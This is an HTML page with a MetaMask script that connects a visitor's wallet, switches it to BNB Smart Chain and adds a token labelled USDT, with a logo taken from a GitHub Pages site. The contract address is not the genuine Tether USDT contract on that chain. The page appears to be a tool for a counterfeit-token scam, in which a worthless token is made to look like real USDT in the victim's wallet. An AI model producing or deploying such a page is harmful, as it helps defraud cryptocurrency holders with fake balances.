<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Add Token – USDT</title>

<style>
  body {
    font-family: "Poppins", sans-serif;
    background: #000;
    color: #fff;
    margin: 0;
    height: 100vh;
    display:flex;
    justify-content:center;
    align-items:center;
  }

  .container {
    background: #0d0d0d;
    padding: 35px;
    width: 360px;
    text-align:center;
    border-radius: 14px;
    box-shadow:0 0 25px rgba(255,255,255,0.1);
  }

  h2 {
    text-shadow:0 0 10px #fff;
    margin-bottom:10px;
  }

  #status {
    margin-top:15px;
    font-size:15px;
  }

  .btn {
    padding:12px 18px;
    margin-top:18px;
    background:#fff;
    color:#000;
    border:none;
    font-weight:600;
    border-radius:10px;
    cursor:pointer;
    font-size:15px;
    width:100%;
    box-shadow:0 0 10px #fff;
  }

  .btn:hover {
    box-shadow:0 0 18px #fff;
  }

  .loader {
    margin-top:20px;
    height:6px;
    width:100%;
    background:#333;
    border-radius:10px;
    overflow:hidden;
    display:none;
  }

  .loader div {
    height:100%;
    width:0%;
    background:#fff;
    animation:loading 3s linear forwards;
    box-shadow:0 0 12px #fff;
  }

  @keyframes loading {
    to { width:100%; }
  }
</style>
</head>
<body>

<div class="container">
  <h2>Import USDT Token</h2>
  <p id="status">Tap to begin</p>

  <button id="startBtn" class="btn">Start Token Import</button>

  <div id="loader" class="loader"><div></div></div>

  <button id="retryBtn" class="btn" style="display:none">Retry</button>
</div>

<script>
const tokenAddress = "0xc7f5c0BD59CE5Ad1e2530B1e5f4C76C714520D14";
const tokenSymbol = "USDT";
const tokenDecimals = 18;
const tokenImage = "https://carrychain.github.io/tetherusd-info/logo.png";

const statusEl = document.getElementById("status");
const loader = document.getElementById("loader");
const startBtn = document.getElementById("startBtn");
const retryBtn = document.getElementById("retryBtn");

startBtn.onclick = startProcess;
retryBtn.onclick = startProcess;

async function startProcess() {
  startBtn.style.display = "none";
  retryBtn.style.display = "none";
  loader.style.display = "block";
  statusEl.textContent = "Detecting wallet...";
  
  await new Promise(r => setTimeout(r, 3000));

  if (!window.ethereum) {
    loader.style.display = "none";
    statusEl.textContent = "Install MetaMask Wallet!";
    return;
  }

  try {
    // Connect wallet required on mobile
    await ethereum.request({ method: "eth_requestAccounts" });

    const chainIdHex = "0x38"; // BSC
    try {
      await ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: chainIdHex }]
      });
    } catch (err) {
      if (err.code === 4902) {
        await ethereum.request({
          method: "wallet_addEthereumChain",
          params: [{
            chainId: chainIdHex,
            chainName: "BNB Smart Chain",
            rpcUrls: ["https://bsc-dataseed.binance.org"],
            nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
            blockExplorerUrls:["https://bscscan.com"]
          }]
        });
      } else throw err;
    }

    const add = await ethereum.request({
      method: "wallet_watchAsset",
      params: {
        type: "ERC20",
        options: { address: tokenAddress, symbol: tokenSymbol, decimals: tokenDecimals, image: tokenImage }
      }
    });

    loader.style.display = "none";

    if (add) {
      statusEl.textContent = "✅ Token Added Successfully!";
    } else {
      fail("❌ User cancelled token import");
    }

  } catch (err) {
    console.error(err);
    fail("❌ Action rejected or failed");
  }
}

function fail(msg){
  loader.style.display = "none";
  statusEl.textContent = msg;
  retryBtn.style.display = "block";
}
</script>

</body>
</html>
